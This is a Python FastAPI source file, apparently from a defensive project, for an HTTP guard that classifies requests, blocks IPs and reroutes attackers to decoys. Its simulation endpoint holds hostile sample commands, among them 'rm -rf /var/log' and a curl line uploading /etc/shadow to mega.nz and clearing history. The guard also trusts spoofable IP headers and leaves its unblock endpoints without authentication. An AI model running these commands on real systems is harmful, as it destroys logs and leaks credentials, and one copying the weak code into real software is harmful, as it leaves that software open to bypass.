import json
import os
import time
from contextlib import asynccontextmanager
from typing import Dict

import httpx
from fastapi import FastAPI, Request, Response
from fastapi.responses import JSONResponse

from agents.decision import build_hybrid_classifier, classify_http_request
from agents.deception import DecoyManager
from interceptor.nftables_manager import NftablesManager
from interceptor.session_store import SessionStore
from agents.insider.insider_adapter import AdaptiveInsiderDetector
from agents.xai import AdaptiveXAINarrator
import ipaddress
from datetime import datetime
import asyncio
from fastapi.responses import StreamingResponse
from honeypot import HoneypotGenerator

# Global event queue will be attached to app.state inside create_http_guard_app
active_event_queue = None


def _is_private_ip(ip: str) -> bool:
    try:
        address = ipaddress.ip_address(ip.strip())
        return address.is_private or address.is_loopback
    except ValueError:
        return False


def _request_to_context(request: Request, body: str) -> Dict:
    source_ip = request.headers.get("x-mock-ip") or request.headers.get("x-forwarded-for") or (request.client.host if request.client else "unknown")
    return {
        "method": request.method,
        "path": request.url.path,
        "query": str(request.url.query or ""),
        "body": body,
        "headers": dict(request.headers),
        "source_ip": source_ip,
    }


def create_http_guard_app(config: Dict) -> FastAPI:

    runtime_cfg = config.get("runtime", {})
    http_cfg = config.get("http_guard", {})
    decoy_cfg = config.get("decoys", {})

    db_path = runtime_cfg.get("db_path", "./runtime/adaptiveshield.db")
    threat_log_path = runtime_cfg.get("threat_log_path", "./runtime/logs/threat_events.jsonl")
    real_host = http_cfg.get("real_service_host", "127.0.0.1")
    real_port = int(http_cfg.get("real_service_port", 8080))
    timeout_sec = int(http_cfg.get("request_timeout_sec", 10))
    brute_force_threshold = int(http_cfg.get("brute_force_threshold", 8))
    block_duration_minutes = int(http_cfg.get("block_duration_minutes", 60))
    fallback_on_error = bool(http_cfg.get("fallback_on_error", True))
    listen_port = int(http_cfg.get("listen_port", 80))
    session_idle_timeout_sec = int(http_cfg.get("session_idle_timeout_sec", 900))

    os.makedirs(os.path.dirname(threat_log_path), exist_ok=True)

    store = SessionStore(db_path)
    nft = NftablesManager()
    nft.ensure_base_ruleset()

    classifier = build_hybrid_classifier()
    insider_detector = AdaptiveInsiderDetector()
    xai_detector = AdaptiveXAINarrator()

    decoys = DecoyManager(
        http_image=decoy_cfg.get("http_image", "adaptiveshield/http-decoy:latest"),
        max_instances=int(decoy_cfg.get("max_instances", 5)),
        idle_timeout_sec=int(decoy_cfg.get("idle_timeout_sec", 300)),
        fallback_url=decoy_cfg.get("fallback_url"),
    )

    galah_enabled = bool(config.get("galah_honeypot", {}).get("enabled", False))
    honeypot_gen = HoneypotGenerator(config, store) if galah_enabled else None

    @asynccontextmanager
    async def lifespan(app: FastAPI):
        decoys.pre_pull_images(decoy_cfg.get("pre_pull_images", []))
        yield
        decoys.shutdown_all_decoys()

    app = FastAPI(title="AdaptiveShield HTTP Guard", version="0.1.0", lifespan=lifespan)
    app.state.store = store
    app.state.nft = nft
    app.state.classifier = classifier
    app.state.decoys = decoys
    app.state.event_queue = asyncio.Queue()
    global active_event_queue
    active_event_queue = app.state.event_queue
    app.state.honeypot_gen = honeypot_gen

    async def forward_request(target_base_url: str, request: Request, body: bytes) -> Response:
        target_url = f"{target_base_url}{request.url.path}"
        if request.url.query:
            target_url = f"{target_url}?{request.url.query}"

        headers = dict(request.headers)
        headers.pop("host", None)

        async with httpx.AsyncClient(timeout=timeout_sec) as client:
            upstream = await client.request(
                request.method,
                target_url,
                headers=headers,
                content=body,
            )

        return Response(
            content=upstream.content,
            status_code=upstream.status_code,
            headers=dict(upstream.headers),
        )

    @app.get("/health")
    async def health():
        from agents.decision import _neural_model
        return {
            "status": "ok",
            "classifier": "hybrid_v2",
            "neural_model": "active" if _neural_model is not None else "unavailable",
            "docker_available": decoys.docker_available,
            "real_service": f"http://{real_host}:{real_port}",
        }
    @app.get("/api/events")
    async def sse_events(request: Request):
        async def event_generator():
            while True:
                if await request.is_disconnected():
                    break
                try:
                    if active_event_queue is not None:
                        event = await asyncio.wait_for(active_event_queue.get(), timeout=1.0)
                        yield f"data: {json.dumps(event)}\n\n"
                        active_event_queue.task_done()
                    else:
                        await asyncio.sleep(1.0)
                except asyncio.TimeoutError:
                    yield ": heartbeat\n\n"
        return StreamingResponse(event_generator(), media_type="text/event-stream")

    @app.get("/api/events/history")
    async def get_event_history():
        cur = store.conn.cursor()
        cur.execute("SELECT details_json FROM request_events ORDER BY id DESC LIMIT 50")
        rows = cur.fetchall()
        past_events = []
        for r in rows:
            try:
                past_events.append(json.loads(r[0]))
            except Exception:
                pass
        return past_events[::-1]

    import httpx
    @app.post("/api/simulate")
    async def run_simulation(request: Request):
        payload = await request.json()
        scenario = payload.get("scenario")
        role = payload.get("role", "developer")
        user_id = payload.get("user_id", "dev_01")
        
        async with httpx.AsyncClient() as client:
            headers = {}
            base_url = f"http://127.0.0.1:{listen_port}"
            if scenario == "normal_user":
                headers = {"x-mock-ip": "84.22.12.19"}
                try:
                    await client.get(f"{base_url}/normal_path", headers=headers)
                except Exception:
                    pass
            elif scenario == "external_recon":
                headers = {"x-mock-ip": "198.51.100.42"}
                try:
                    await client.get(f"{base_url}/.git/config", headers=headers)
                except Exception:
                    pass
            elif scenario == "external_destructive":
                headers = {"x-mock-ip": "203.0.113.111"}
                try:
                    await client.get(f"{base_url}/admin/shell?cmd=rm+-rf+/var/log", headers=headers)
                except Exception:
                    pass
            elif scenario == "insider_normal":
                headers = {
                    "x-mock-ip": "192.168.1.75",
                    "x-user-id": user_id,
                    "x-user-role": role
                }
                try:
                    await client.post(f"{base_url}/normal_path", headers=headers)
                except Exception:
                    pass
            elif scenario == "insider_recon":
                headers = {
                    "x-mock-ip": "192.168.1.75",
                    "x-user-id": user_id,
                    "x-user-role": role
                }
                try:
                    await client.post(f"{base_url}/hr/employees.csv", headers=headers)
                except Exception:
                    pass
            elif scenario == "insider_sabotage":
                headers = {
                    "x-mock-ip": "192.168.1.75",
                    "x-user-id": user_id,
                    "x-user-role": role
                }
                try:
                    await client.post(f"{base_url}/etc/shadow", headers=headers, json={
                        "command": "curl -F file=@/etc/shadow mega.nz/upload; history -c",
                        "cloud_upload": True
                    })
                except Exception:
                    pass
            elif scenario == "custom_command":
                cmd = payload.get("command", "")
                origin = payload.get("origin", "internal")
                if origin == "external":
                    import urllib.parse
                    headers = {"x-mock-ip": "84.22.12.19"}
                    try:
                        await client.get(f"{base_url}/admin/shell?cmd={urllib.parse.quote(cmd)}", headers=headers)
                    except Exception:
                        pass
                else:
                    headers = {
                        "x-mock-ip": "192.168.1.75",
                        "x-user-id": user_id,
                        "x-user-role": role
                    }
                    try:
                        await client.post(f"{base_url}/custom_insider_command", headers=headers, json={
                            "command": cmd
                        })
                    except Exception:
                        pass
        return {"status": "simulation_fired"}

    @app.post("/api/unblock")
    async def release_blocked_ip(request: Request):
        payload = await request.json()
        ip = payload.get("ip")
        if ip:
            store.unblock_ip(ip)
            nft.unblock_ip(ip)
        return {"status": "unblocked", "ip": ip}

    @app.post("/api/reset_session")
    async def reset_session_risk(request: Request):
        payload = await request.json()
        session_id = payload.get("session_id")
        if session_id:
            # Unblock IP if it was blocked
            cur = store.conn.cursor()
            cur.execute("SELECT src_ip FROM sessions WHERE id = ?", (session_id,))
            row = cur.fetchone()
            if row:
                ip = row[0]
                store.unblock_ip(ip)
                nft.unblock_ip(ip)
            
            # Clear database and in-memory states
            store.reset_session(session_id)
            insider_detector.reset_session_state(session_id)
        return {"status": "success", "session_id": session_id}

    from fastapi.responses import HTMLResponse
    @app.get("/dashboard", response_class=HTMLResponse)
    async def get_dashboard():
        template_path = os.path.join(os.path.dirname(__file__), "..", "orchestrator", "templates", "dashboard.html")
        if os.path.exists(template_path):
            with open(template_path, "r", encoding="utf-8") as f:
                return f.read()
        return "Dashboard template not found."

    @app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"])
    async def guard(path: str, request: Request):
        raw_body = await request.body()
        body_str = raw_body.decode("utf-8", errors="ignore")

        context = _request_to_context(request, body_str)
        src_ip = context["source_ip"]

        blocked_until = store.get_blocked_until(src_ip)
        if blocked_until and blocked_until > time.time():
            # Log blocked attempt event to the dashboard
            session_id = store.get_or_create_session(src_ip, idle_timeout_sec=session_idle_timeout_sec)
            
            event = {
                "timestamp": time.time(),
                "session_id": session_id,
                "source_ip": src_ip,
                "method": request.method,
                "path": request.url.path,
                "query": str(request.url.query or ""),
                "label": "Destructive",
                "action": "drop_and_block",
                "target": "blocked",
                "rule": "IP is banned in kernel firewall",
                "mitre_tactics": ["defense_evasion"],
                "severity_max": 10,
                "response_status": 403,
                "is_insider": _is_private_ip(src_ip),
                "login_attempts": store.get_counter(session_id, "login_attempts"),
            }
            
            # Generate XAI Explanation
            from interfaces.xai_contract import ClassificationEvent, RoutingDecision
            xai_features = {
                "already_blocked": True,
                "risk_score": 100.0,
                "role": request.headers.get("x-user-role", "attacker")
            }
            xai_event = ClassificationEvent(
                session_id=session_id,
                timestamp=datetime.now().isoformat() + "Z",
                src_ip=src_ip,
                commands=[body_str] if body_str else [],
                classification="Destructive",
                confidence=1.0,
                mitre_techniques=["T1000"],
                features_used=xai_features
            )
            xai_decision = RoutingDecision(
                session_id=session_id,
                action="drop_and_block",
                target="blocked",
                reason="IP is already blocked in firewall"
            )
            explanation = xai_detector.generate_explanation(xai_event, xai_decision)
            
            event["xai_summary"] = explanation.summary
            event["xai_detailed"] = explanation.detailed
            event["xai_risk_score"] = explanation.risk_score
            event["xai_recommendations"] = explanation.recommended_actions
            
            try:
                if active_event_queue is not None:
                    await active_event_queue.put(event)
            except Exception:
                pass
            
            store.write_event(session_id, event)
            try:
                with open(threat_log_path, "a", encoding="utf-8") as f:
                    f.write(json.dumps(event) + "\n")
            except Exception:
                pass
            
            return JSONResponse(
                status_code=403,
                content={"error": "blocked", "reason": "temporary_block", "blocked_until": blocked_until},
            )

        session_id = store.get_or_create_session(src_ip, idle_timeout_sec=session_idle_timeout_sec)
        ctx = store._get_context(session_id)
        
        # Always fetch command history and classify the current request
        command_history = store.get_command_history(session_id)
        decision = classify_http_request(classifier, context, command_history=command_history)
        
        # Update command history with the current extracted command
        extracted_cmd = decision.get("extracted_command", "")
        if extracted_cmd and extracted_cmd != "/":
            store.append_command_history(session_id, extracted_cmd)

        # Simple brute-force detection for HTTP login endpoints.
        path_lower = request.url.path.lower()
        if request.method.upper() == "POST" and any(k in path_lower for k in ["login", "signin", "auth"]):
            attempts = store.increment_counter(session_id, "login_attempts")
            if attempts >= brute_force_threshold:
                decision = {
                    "class_id": 3,
                    "label": "Exploit",
                    "confidence": 1.0,
                    "action": "drop_and_block",
                    "rule": "HTTP brute-force threshold exceeded",
                    "mitre_tactics": ["credential_access"],
                    "severity_max": 8,
                    "http_findings": ["brute_force"],
                }

        # Determine base risk score from external neural network classification
        confidence = decision.get("neural_confidence", 1.0)
        ext_label = decision["label"].lower()
        if decision.get("action") == "drop_and_block":
            base_risk_score = 100.0
        elif ext_label == "safe":
            base_risk_score = confidence * 10.0
        elif ext_label == "recon":
            base_risk_score = 30.0 + (confidence * 20.0)
        elif ext_label in ("downloader", "exploit"):
            base_risk_score = 50.0 + (confidence * 25.0)
        else: # Destructive, APT
            base_risk_score = 75.0 + (confidence * 25.0)

        # Check for Insider Threat if source IP is internal/private
        is_internal = _is_private_ip(src_ip)
        risk_score = base_risk_score
        insider_threat = None
        
        if is_internal:
            from interfaces.insider_contract import UserBehaviorSignal
            
            # Extract simulated features from HTTP JSON body if available
            extra_details = {}
            if body_str:
                try:
                    body_json = json.loads(body_str)
                    if isinstance(body_json, dict):
                        extra_details = body_json
                except Exception:
                    pass
            
            action_details = {
                "command": extra_details.get("command", decision.get("extracted_command", "")),
                "file_path": request.url.path,
                "role": request.headers.get("x-user-role", "normal"),
                **extra_details
            }
            
            signal = UserBehaviorSignal(
                user_id=request.headers.get("x-user-id", "unknown_user"),
                session_id=session_id,
                timestamp=datetime.now().isoformat() + "Z",
                action_type=request.method,
                action_details=action_details,
                source_ip=src_ip,
                is_internal=True
            )
            insider_threat = insider_detector.analyze_signal(signal)
            # Combine external and internal threat risk scores
            risk_score = max(insider_threat.risk_score, base_risk_score)

        # Policy Engine Decides
        if risk_score <= 30.0:
            policy_decision = "NORMAL"
            action = "forward"
        elif risk_score <= 60.0:
            policy_decision = "MONITOR"
            action = "forward"
            decision["rule"] = decision.get("rule") or "Policy: Monitor active session"
        elif risk_score <= 80.0:
            policy_decision = "ALERT"
            action = "redirect_to_decoy"
            decision["rule"] = decision.get("rule") or "Policy: High risk behavior, rerouted to decoy"
        else:
            policy_decision = "CONTAIN"
            action = "drop_and_block"
            decision["rule"] = decision.get("rule") or f"Policy: Containment triggered. Risk level: {risk_score}%"
            decision["label"] = "Destructive"

        decision["action"] = action
        target = f"http://{real_host}:{real_port}"
        result = None

        # Determine redirection
        should_redirect_to_decoy = False
        if action == "drop_and_block":
            pass
        elif ctx.get("redirected_to_decoy"):
            should_redirect_to_decoy = True
        elif action == "redirect_to_decoy" or (galah_enabled and decision.get("label") not in ("Safe", "Recon")):
            should_redirect_to_decoy = True

        if action == "drop_and_block":
            target = "blocked"
            block_seconds = block_duration_minutes * 60
            store.mark_blocked(session_id, block_seconds)
            nft.block_ip(src_ip, reason=decision.get("rule"))
            result = JSONResponse(
                status_code=403,
                content={
                    "error": "request_blocked",
                    "label": decision["label"],
                    "rule": decision.get("rule"),
                },
            )
        elif should_redirect_to_decoy:
            action = "redirect_to_decoy"
            decoy = decoys.get_or_spawn_http_decoy(session_id)
            if decoy:
                target = decoy.base_url
                
                # Check for first-time redirection or behavior escalation
                prev_label = ctx.get("decoy_label")
                prev_severity = ctx.get("decoy_severity_max", 0)
                is_escalation = (
                    not ctx.get("redirected_to_decoy") or 
                    (decision["label"] != "Safe" and (
                        decision["label"] != prev_label or 
                        decision["severity_max"] > prev_severity
                    ))
                )
                
                if is_escalation and galah_enabled and honeypot_gen:
                    try:
                        await honeypot_gen.prepare_decoy_files(
                            session_id=session_id,
                            decision=decision,
                            request=request,
                            body_str=body_str,
                            html_dir=decoy.html_dir,
                            container_id=decoy.container_id,
                            decoys_manager=decoys
                        )
                    except Exception as e:
                        import logging
                        logging.getLogger(__name__).exception("Failed to prepare decoy files")

                    store.update_context(session_id, {
                        "redirected_to_decoy": True,
                        "decoy_base_url": target,
                        "decoy_class_id": decision["class_id"],
                        "decoy_label": decision["label"],
                        "decoy_rule": decision.get("rule"),
                        "decoy_mitre_tactics": decision.get("mitre_tactics", []),
                        "decoy_severity_max": decision.get("severity_max", 0),
                    })
                
                # Decoy Cold-Start Fix
                max_retries = 10
                for i in range(max_retries):
                    try:
                        result = await forward_request(target, request, raw_body)
                        break
                    except Exception:
                        if i == max_retries - 1:
                            result = JSONResponse(
                                status_code=502,
                                content={"error": "upstream_failure", "target": target},
                            )
                        else:
                            import asyncio
                            await asyncio.sleep(0.1)
            else:
                result = JSONResponse(
                    status_code=502,
                    content={"error": "real_service_unreachable"},
                )
        else:
            try:
                result = await forward_request(target, request, raw_body)
            except Exception:
                if fallback_on_error:
                    decoy = decoys.get_or_spawn_http_decoy(session_id)
                    if decoy:
                        target = decoy.base_url
                        
                        if galah_enabled and honeypot_gen:
                            try:
                                await honeypot_gen.prepare_decoy_files(
                                    session_id=session_id,
                                    decision=decision,
                                    request=request,
                                    body_str=body_str,
                                    html_dir=decoy.html_dir,
                                    container_id=decoy.container_id,
                                    decoys_manager=decoys
                                )
                            except Exception:
                                pass

                        store.update_context(session_id, {
                            "redirected_to_decoy": True,
                            "decoy_base_url": target,
                            "decoy_class_id": decision["class_id"],
                            "decoy_label": decision["label"],
                            "decoy_rule": decision.get("rule") or "Real service offline, fallback to decoy",
                            "decoy_mitre_tactics": decision.get("mitre_tactics", []),
                            "decoy_severity_max": decision.get("severity_max", 0),
                        })
                        try:
                            result = await forward_request(target, request, raw_body)
                        except Exception:
                            result = JSONResponse(
                                status_code=502,
                                content={"error": "upstream_failure", "target": target},
                            )
                    else:
                        result = JSONResponse(
                            status_code=502,
                            content={"error": "real_service_unreachable"},
                        )
                else:
                    result = JSONResponse(
                        status_code=502,
                        content={"error": "real_service_unreachable"},
                    )

        event = {
            "timestamp": time.time(),
            "session_id": session_id,
            "source_ip": src_ip,
            "method": request.method,
            "path": request.url.path,
            "query": str(request.url.query or ""),
            "label": decision["label"],
            "action": action,
            "target": target,
            "rule": decision.get("rule"),
            "mitre_tactics": decision.get("mitre_tactics", []),
            "severity_max": decision.get("severity_max", 0),
            "response_status": result.status_code if result else 500,
            "login_attempts": store.get_counter(session_id, "login_attempts"),
            "is_insider": is_internal,
        }

        # Include neural model metadata when available
        if "neural_confidence" in decision:
            event["neural_confidence"] = decision["neural_confidence"]
        if "fallback_reason" in decision:
            event["fallback_reason"] = decision["fallback_reason"]

        if decision["label"] != "Safe" and brute_force_threshold > 0:
            if decision["label"] in ("Recon", "Downloader", "Exploit", "Destructive", "ADVANCED_APT"):
                event["suspicious"] = True

        # Generate XAI Explanation
        from interfaces.xai_contract import ClassificationEvent, RoutingDecision
        is_insider_active = is_internal and insider_threat is not None
        
        event["risk_score"] = risk_score
        event["policy_decision"] = policy_decision
        if is_insider_active:
            event["evidence_features"] = {k: v for k, v in insider_threat.features.items() if v > 0} if insider_threat.features else {}

        xai_features = {
            "risk_score": risk_score,
            "policy_decision": policy_decision
        }
        if is_insider_active:
            xai_features.update({
                "insider_threat": True if action == "drop_and_block" else False,
                "role": request.headers.get("x-user-role", "normal"),
                "anomaly_factors": insider_threat.anomaly_factors,
                "evidence_features": insider_threat.features
            })

        xai_event = ClassificationEvent(
            session_id=session_id,
            timestamp=datetime.now().isoformat() + "Z",
            src_ip=src_ip,
            commands=[decision.get("extracted_command", "")] if decision.get("extracted_command") else [],
            classification=decision["label"],
            confidence=decision.get("neural_confidence", 1.0),
            mitre_techniques=decision.get("mitre_tactics", []),
            features_used=xai_features
        )
        xai_decision = RoutingDecision(
            session_id=session_id,
            action=action,
            target=target,
            reason=decision.get("rule", "Classification triggered")
        )
        
        explanation = xai_detector.generate_explanation(xai_event, xai_decision)
        
        event["xai_summary"] = explanation.summary
        event["xai_detailed"] = explanation.detailed
        event["xai_risk_score"] = explanation.risk_score
        event["xai_recommendations"] = explanation.recommended_actions

        # Push to live dashboard stream queue
        try:
            if active_event_queue is not None:
                await active_event_queue.put(event)
        except Exception:
            pass

        store.write_event(session_id, event)
        with open(threat_log_path, "a", encoding="utf-8") as f:
            f.write(json.dumps(event) + "\n")
        print(json.dumps(event), flush=True)

        return result

    return app
